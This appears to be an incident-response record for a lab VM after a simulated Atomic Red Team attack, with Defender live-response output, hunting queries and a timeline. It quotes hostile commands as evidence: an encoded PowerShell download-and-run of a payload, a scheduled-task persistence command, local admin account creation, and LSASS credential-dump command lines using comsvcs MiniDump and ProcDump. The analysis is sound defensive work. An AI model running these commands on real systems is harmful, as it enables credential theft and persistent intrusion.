# Post-attack live response: vm-ir-lab-01

Taken with MDE live response on 2026-11-24, after the attack chain ran,
before any cleanup and before shutdown. Compare with `baseline-pre-attack.md`.

Live response commands, from the Action center history (portal shows AEDT, UTC+11):

| UTC | AEDT | Session | Command |
|---|---|---|---|
| 06:47 | 5:47 PM | b7994f | `connect` |
| 06:47 | 5:47 PM | b7994f | `processes` |
| 06:48 | 5:48 PM | b7994f | `connections` |
| 06:48 | 5:48 PM | b7994f | `scheduledtasks` |
| 06:48 | 5:48 PM | b7994f | `persistence` |
| 06:49 | 5:49 PM | b7994f | `dir C:\` |

File and task times below are as live response shows them, and they are UTC: the
`\spawn` registration time (05:45:32) matches the "Masqueraded task or service" alert
at 4:45:32 PM AEDT (05:45:32 UTC), and `Program Files` modified at 04:45:52 matches
`DeviceFileEvents` at 3:45:52 PM AEDT (see Hunting results).

## State at capture

- Device not isolated: an RDP session on 3389 was established from the owner's
  source IP (the NSG allows 3389 only from it). The owner confirmed it was their
  own session: owner activity, not attacker activity.
- `iradmin` was signed in (`explorer.exe`, `rdpclip.exe`, `sihost.exe`), so the account
  was not disabled at capture time. Attack disruption had contained the user at
  05:58:59 UTC (see Hunting results), but that did not sign the account out.
- The VM booted at about 2026-11-24 04:36 (`pagefile.sys` and `DumpStack.log.tmp` last
  modified), before the first new folder (`C:\AtomicRedTeam`, 04:45). No reboot since,
  so this capture covers the whole attack.

## Differences from the baseline

| Area | Baseline | Now |
|---|---|---|
| Scheduled tasks outside `\Microsoft\Windows\` | 2 Edge update tasks | Same 2, plus **`\spawn`** |
| `C:\` root | No new folders after deploy | New **`C:\AtomicRedTeam`** (created 04:45:46, modified 06:26:24) and **`C:\lab`** (created 05:30:06, modified 05:30:32). `Program Files` modified 04:45:52 |
| Processes | No interactive user | `iradmin` RDP session; **`powershell.exe` PID 4008**, parent `explorer.exe`, about 125 MB, still running |
| HKLM autoruns | See baseline | Unchanged |
| `C:\Users` | Last modified 2026-11-23 00:24 | Unchanged, so no new user profile was created. The new local account has likely never signed in (confirm with `DeviceLogonEvents`) |

## `\spawn` task

- Author `vm-ir-lab-01\iradmin`, registered 2026-11-24 05:45:32.
- Trigger: one time, 2026-11-24 20:10:00 (VM local time).
- Action: `C:\windows\system32\cmd.exe`, no arguments.
- Runs as the built-in admin account (RID 500, which is `iradmin`) with an interactive
  logon token, so it only runs while that user is signed in.
- `startWhenAvailable` is not set: if the VM is off at the trigger time, the task does
  not run later. Low risk of it firing on the next boot.

## Unchanged (not leads)

- HKLM autoruns match the baseline: Run has `SecurityHealth` only, Winlogon defaults,
  `AppInit_DLLs` empty, Active Setup includes Edge 158.0.4370.33. Startup folders empty.
- MDE sensor, Defender and Azure agents running. Windows Update busy again.
- `DefenderSessionHelper.exe` in `iradmin`'s session: Defender's user notification helper,
  expected after detections.
- Two `SenseIR.exe` processes: live response itself.
- `lsass.exe` PID 736, parent `wininit.exe`: normal.
- Listening ports: 135, 3389, 49664–49670 (RPC). No unexpected listener.
  (The baseline did not capture `connections`.)
- Outbound connections only from MDE, Azure agents and `svchost.exe` to Microsoft/Azure
  endpoints (for example the Azure platform address 168[.]63[.]129[.]16).
  No outbound connection from `powershell.exe` or any user process at capture time.

## Open leads

The VM was shut down (deallocated) on 2026-11-24 after this capture, before leads 2–5
were run on the device. The volatile state above was already captured. Leads 2–5 are
disk state, so they survive the shutdown: check them first in advanced hunting, and
on the device only if hunting leaves a gap, before any cleanup.

1. `powershell.exe` PID 4008: command line and start time, from `DeviceProcessEvents`.
2. `C:\lab`: contents, from `DeviceFileEvents` (`FolderPath` under `C:\lab`). [result]
3. `Program Files` modified at 04:45:52: what was added, from `DeviceFileEvents`. [result]
4. The folder holding the file named in the step-1 alert evidence, from `DeviceFileEvents`. [result]
5. Local accounts and HKCU `Run` / `RunOnce`: account creation and group changes from
   `DeviceEvents`, and `Run` / `RunOnce` writes from `DeviceRegistryEvents`. [result]
   If the device is started again, repeat the baseline `net` and `reg query` commands.

## Hunting results (2026-11-24, window 04:30–07:00 UTC)

Portal times are AEDT; UTC is given first.

- **Alert file evidence** (`AlertInfo` + `AlertEvidence`, `EntityType == "File"`):
  - 04:47:31 UTC: a batch of AV alerts (PowerSploit post-exploitation tool, ShellCode,
    DDEDownloader, Empyre, ransomware-linked actor) on files under
    `C:\AtomicRedTeam\tmp\atomic-red-team-master\`. These are test files from the
    Atomic Red Team download, not attack chain steps. Treat them as install noise.
  - 05:45:32 UTC: "Masqueraded task or service", file `cmd.exe` in `C:\Windows\System32`.
    Same second as the `\spawn` registration.
  - 05:52:17 UTC: "Suspicious behavior by cmd.exe was observed".
  - No alert has the step-1 payload as file evidence.
- **All alerts in the window** (`AlertInfo`, 17 titles: 6 from the Atomic download
  at 04:47:31 UTC, listed above, and these 11):

  | First (UTC) | Title | Severity | Note |
  |---|---|---|---|
  | 04:38:16 | Potential human-operated malicious activity (3 alerts) | High | The 04:38:16 one has only Machine (verdict Suspicious, re-analysed 06:04) and Azure VM resource evidence. Device-level summary alert, not a separate pre-attack event. See `walkthrough.md`, section 1 |
  | 05:45:32 | Masqueraded task or service | Low | `\spawn` registration (step 2) |
  | 05:45:33 | Hands-on-keyboard attack involving multiple devices | High | User `iradmin`, machine |
  | 05:45:33 | Compromised account conducting hands-on-keyboard attack | High | User `iradmin`, machine |

  At 05:45:33 the "Potential human-operated" alert carries the step-2 process chain:
  `powershell.exe` → `"cmd.exe" /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10`
  → `schtasks.exe`. Another one at 05:52:17 has user `iradmin` and the machine.
  | 05:52:17 | Suspicious account creation | Medium | Step 3 |
  | 05:52:17 | Suspicious Windows account manipulation | Medium | Step 3 |
  | 05:52:17 | Suspicious behavior by cmd.exe was observed | Medium | Step 3 |
  | 05:52:17 | New local admin added using Net commands | Medium | Step 3 |
  | 06:02:58 | An active 'RundllLolBin' malware in a command line was prevented from executing | Low | Step 4, first attempt, prevented |
  | 06:06:35 | Lateral movement using RDP blocked | Informational | Effect of the 05:58:59 user containment. The first RDP session ended within 2 seconds (see Step 1) |
  | 06:26:47 | An active 'DumpLsass' hacktool in a command line was prevented from executing | Medium | Step 4, second attempt, prevented |

  Incident 15 Activities (export) has one entry: at 06:01:16 UTC Defender XDR renamed the
  incident from "Multi-stage incident involving Persistence & Lateral movement including
  Ransomware on one endpoint" to "Hands-on keyboard attack was launched from a compromised
  account (attack disruption)". It lists no containment action.

  **Action center history** (export, 2026-11-24): the only automatic action is
  `LMFContainUser` on account `iradmin` (RID 500), 05:58:59 UTC, decided by
  "Attack disruption", status Completed, described as "Containment of a pre-incriminated
  user in an attack disruption scenario". No device isolation, no account disable,
  no file or process remediation. Every other entry is the owner's live response.

  Order: steps 2 and 3 (05:45, 05:52) → user contained (05:58:59) → incident renamed
  (06:01:16) → first dump attempt in the same session, blocked by AV (06:02:48) →
  "Lateral movement using RDP blocked" and the first RDP session ends (06:06:35–37) →
  `iradmin` signs in again over RDP (06:07:24) → second dump attempt, blocked (06:26:38).
  So user containment did not stop actions inside the session that was already open,
  and did not stop the later RDP sign-in. Cause not confirmed; see below.

  What is known so far (2026-11-25):
  - Action center history (re-export) has no undo or release of the containment: only
    `LMFContainUser` and the owner's live response commands.
  - Microsoft's documentation says a contained user is blocked on onboarded devices for
    incoming network logons, RPC, SMB and RDP, ongoing RDP sessions are logged off, the
    account itself is not disabled, and attack disruption releases the user within five
    days. The logoff matches (06:06:35); the allowed RDP sign-in at 06:07:24 does not.
  - Incident 15 Activities, filtered to Attack disruption (export): one row, "iradmin
    contained", Contain User, 05:58:59.725 UTC, automated, status Completed, triggered by
    alert `da040c57e3-…_1` [which alert]. No release row. Policy status (added with
    Customize columns, re-export 2026-11-25): **Active**.
  - So the containment policy was never released and is still active, yet `iradmin`
    signed in over RDP at 06:07:24 and ran step 4 again. The containment logged off the
    open session but did not block a new one. Possible reason, not confirmed: the block
    targets lateral movement from other devices, and this sign-in came from the owner's
    Mac over the internet, which is not an onboarded device.
  - `DisruptionAndResponseEvents`, 05:55–07:00 UTC (2026-11-25): two rows only, both
    06:06:35, policy `ContainUser`, session 2, user `iradmin` (RID 500), source device
    the owner's Mac: `ContainedUserRemoteDesktopSessionDisconnected` (Blocked) and
    `ContainedUserRemoteDesktopSessionStopped` (Prevented). No `ContainedUserLogonBlocked`
    at or after 06:07. So the 06:07:24 RDP sign-in was not blocked or even logged by
    containment, while the policy stayed Active. This fits the reason above, but
    Microsoft's documentation does not say it, so it stays unconfirmed.
  - Phase 6: `iradmin` is still contained. Before cleanup, release it ("Undo" on the
    action) or expect RDP to be cut again.

  **No alert for step 1** (payload download and start at 05:31:10 UTC, see below).
  Built-in detections missed it, so phase 5 needs a custom rule for it.

## Step 1 from `PowerShellCommand` events

`DeviceEvents`, `ActionType == "PowerShellCommand"`, `AdditionalFields.Command`:

- 05:25:41 UTC, PowerShell PID 6520: a test runner command for T1059.001, test 1,
  with a `payload_url` argument.
- 05:30:06 UTC: `C:\lab` created (live response). 05:31:05 UTC: PID 6520 runs
  `cd C:\lab\simulation`. So `C:\lab` is the operator's working folder for the attack.
- 05:31:10 UTC, child PowerShell PID 5488:
  `Invoke-WebRequest -Uri 'hxxps://[lab storage account].blob.core.windows[.]net/lab/stub.exe?[SAS token]' -OutFile 'C:\Users\iradmin\AppData\Local\Temp\2\update-svc.exe'; Start-Process -FilePath 'C:\Users\iradmin\AppData\Local\Temp\2\update-svc.exe'`
  - Payload on disk: **`C:\Users\iradmin\AppData\Local\Temp\2\update-svc.exe`**
    (source blob `stub.exe`).
  - The SAS token is read-only, MDE masked its signature, and it expires
    2026-11-25 05:21 UTC. The token also carries tenant and object IDs, so it is left out here.
- `DeviceFileEvents` / `DeviceProcessEvents`:
  - The writing process (PID 5488) command line is
    `"powershell.exe" -NoProfile -EncodedCommand [base64]`: the step was an encoded
    command. The base64 decodes to the `Invoke-WebRequest` line above, SAS included,
    so it is left out here.
  - 05:31:11 UTC `FileCreated` by `powershell.exe`, SHA256
    **`8765f0fee6655cae983f7c1539d3e1cf2735c1c7951171a35fe54e1b140de66e`**.
  - 05:31:11 UTC `ProcessCreated`: `update-svc.exe` ran, parent `powershell.exe`, and
    started `conhost.exe` (a console program). Not in the live response process list
    at 06:47, so it had exited by then.
  - 06:06:37 UTC `FileDeleted` by `svchost.exe`, 2 seconds after the
    "Lateral movement using RDP blocked" alert. `Temp\2` is the temp folder of RDP
    session 2, and Windows deletes it when that session signs out.
  - `DeviceLogonEvents` for `iradmin`, 06:00–06:15 UTC: `Network` logon at 06:07:23, then
    `RemoteInteractive` logon at 06:07:24, and a new `explorer.exe` (PID 6852) at
    06:07:25. The first session's `explorer.exe` was PID 2360 (04:41:14). No logoff
    events in this table. So the first RDP session ended between 06:06:35 and 06:06:37
    and `iradmin` signed in again over RDP 49 seconds later. The owner confirmed the RDP
    session dropped at about 5:06 PM AEDT (06:06 UTC) and they reconnected. The drop
    lines up with the "Lateral movement using RDP blocked" alert (06:06:35).
  - Confirmed by `DeviceEvents` (Go hunt on `iradmin`, 2026-11-25): at 06:06:35 UTC
    `ContainedUserRemoteDesktopSessionDisconnected` and
    `ContainedUserRemoteDesktopSessionStopped`, `SessionId` 2. The user containment
    from 05:58:59 ended the first RDP session.
  - So the payload is no longer on disk: `getfile` cannot fetch it. The SHA256 above is
    what the phase 6 indicator uses.

## Step 4 from `PowerShellCommand` events

PowerShell PID 4008 (the interactive console still open at capture):

- 06:09:35 UTC started; 06:09:53–06:11:45 `cd c:\`, `cd lab`, `cd C:\lab\simulation`.
- 06:26:09 loads the test runner module.
- 06:26:22 `Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs`, prereq met 06:26:27.
- 06:26:32 `Invoke-AtomicTest T1003.001 -TestNumbers 1`, done 06:26:34.
- Matches the 'DumpLsass' prevented alert (06:26:47) and `C:\AtomicRedTeam` last
  modified 06:26:24 (prereq download).
- `DeviceProcessEvents` 06:00–06:30 (`comsvcs`, `MiniDump`, `procdump`, `lsass`) only
  shows the 06:26:24 prereq: PID 4008 starts `powershell.exe`, which downloads
  `Procdump.zip` from Sysinternals (hxxps://download.sysinternals[.]com) and puts
  `procdump.exe` in `C:\AtomicRedTeam\ExternalPayloads\`. That file is a cleanup item.
- No process event for either dump command (06:02:58 or 06:26:32). Both alerts say the
  command line "was prevented from executing", so the process was likely blocked
  before it was created.
- The alert evidence does not hold the dump command either. Its process entity is the
  PowerShell host that ran it, with command line `"powershell.exe"`:

  | Alert | Process | Started | Parent | Verdict | Blocked |
  |---|---|---|---|---|---|
  | 'RundllLolBin' (06:02:58) | `powershell.exe` PID 6520 | 04:44:48 | `explorer.exe` PID 2360 (04:41:14, first RDP session) | Malicious 06:02:43 | 06:02:48 |
  | 'DumpLsass' (06:26:47) | `powershell.exe` PID 4008 | 06:09:35 | `explorer.exe` PID 6852 (06:07:25, second RDP session) | Malicious 06:26:33 | 06:26:38 |

  Both are `iradmin`. PID 6520 is the same shell that ran step 1 (05:25–05:31), so one
  console ran the chain from the Atomic install (04:45) to the first dump attempt.
- `PowerShellCommand` events in PID 6520 before the first block:
  - 06:02:22 `Invoke-AtomicTest T1003.001 -ShowDetailsBrief`
  - 06:02:35 `Invoke-AtomicTest T1003.001 -TestNumbers 2 -GetPrereqs`
  - 06:02:42 `Invoke-AtomicTest T1003.001 -TestNumbers 2`, judged malicious at 06:02:43
    and blocked at 06:02:48.
  - No event holds the dump command itself (no `rundll32`, `comsvcs` or `MiniDump`
    match at 06:02–06:03). The VM's own Defender log does: `Get-MpThreatDetection`
    (run 2026-11-25, `response.md` step 4) lists both command lines. 06:02:43,
    removed 06:02:58: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
    (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full`. 06:26:33, removed
    06:26:47: `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp`.
- So step 4 was tried twice: test 2 at 06:02:42 (family 'RundllLolBin', which points to
  `rundll32`, a LotL method), then test 1 at 06:26:32 with ProcDump, a signed
  Sysinternals tool downloaded for the test, not a built-in Windows tool. Both were
  blocked, and no dump file was seen.
- **Lead 1**: `powershell.exe` PID 4008 started 06:09:35 UTC (5:09:35 PM AEDT),
  account `iradmin`, parent `explorer.exe`, command line `powershell.exe` with no
  arguments. It is an interactive console, so commands typed into it are not in
  `ProcessCommandLine`, but they are in `PowerShellCommand` events: it ran the second
  step-4 attempt (see Step 4 above). Closed.
- **Lead 2**: no `DeviceFileEvents` under `C:\lab` (MDE does not log folder creation,
  and may not log every file write). `PowerShellCommand` events show `C:\lab\simulation`
  is the operator's working folder (see Step 1 above). Closed.
  **Update 2026-11-25:** `DeviceFileEvents` show the files first landed in
  `C:\simulation` at 05:09:34 UTC (written by `explorer.exe`, copied in over RDP):
  `run-chain.ps1`, `payload-stub\build-stub.ps1`, `atomics\T1059.001`. At 05:10:22
  `csc.exe` compiled `payload-stub\stub.exe`, SHA256 equal to `update-svc.exe`.
  `C:\simulation` is gone by 06:49 with no delete event, so it was moved into
  `C:\lab` at about 05:30. Confirmed 2026-11-25: `stub.exe` is at
  `C:\lab\simulation\payload-stub\stub.exe` with its 05:10:22 write time
  (`response.md`, step 4). Cleanup item: `C:\lab\simulation`.
- **Lead 3**: 6 `FileCreated` events under `C:\Program Files\` by `powershell.exe`:
  - 04:45:52 UTC: `WindowsPowerShell\Scripts`, `WindowsPowerShell\Scripts\InstalledScriptInfos`,
    `PackageManagement`, `PackageManagement\ProviderAssemblies`.
  - 04:46:13 UTC: `PackageManagement\ProviderAssemblies\nuget` and
    `nuget\2.8.5.208\Microsoft.PackageManagement.NuGetProvider.dll`.
  - This is PowerShell installing the NuGet package provider, the first step of
    installing a module or script from the PowerShell Gallery. It comes right before
    the Atomic Red Team files (04:47:31). Treat it as tool install, not an attack step.
    Closed.
- **Lead 4**: no alert carries the step-1 file. The payload was
  `C:\Users\iradmin\AppData\Local\Temp\2\update-svc.exe`, created and run at 05:31:11 UTC
  and deleted at 06:06:37 UTC (see Step 1). Closed.
- **Lead 5**: no `Run` / `RunOnce` writes in `DeviceRegistryEvents`. The first
  `DeviceEvents` query (36 action types in the window) showed no `UserAccount*` events.
  **Corrected 2026-11-25:** an account-scoped query on `iradmin` returned
  `UserAccountCreated`, `UserAccountModified`, `UserAccountPasswordResetAttempt` and
  two `UserAccountAddedToLocalGroup` (`Builtin\Users` and `Builtin\Administrators`, from
  `AdditionalFields.GroupName`), all 05:52:17 UTC, account `t1136.001_admin`, by
  `iradmin`. A device-wide rerun returns the same rows, so the first result was misread
  or not yet ingested (see `walkthrough.md`, sections 3 and 6).
  The account creation is also in `DeviceProcessEvents`:
  - 05:52:17 UTC, account `iradmin`, parent `cmd.exe`: `net user /add` (→ `net1.exe`),
    then `net localgroup administrators "T1136.001_Admin" /add` (→ `net1.exe`).
    New local admin account: **`T1136.001_Admin`**.
  - Same second as the four 05:52:17 account alerts.
  - MDE masked the wrong argument: in `net user /add` it replaced the account name with
    `**********` and left the password in clear text. The account name comes from the
    `localgroup` command. Do not copy the password into notes, the PIR or screenshots.
  - `DeviceLogonEvents` for `T1136.001_Admin` since 05:50 UTC: no rows. The account
    has never signed in, which matches no new profile under `C:\Users`.
- **`C:\lab` in command lines**: no `DeviceProcessEvents` hit.
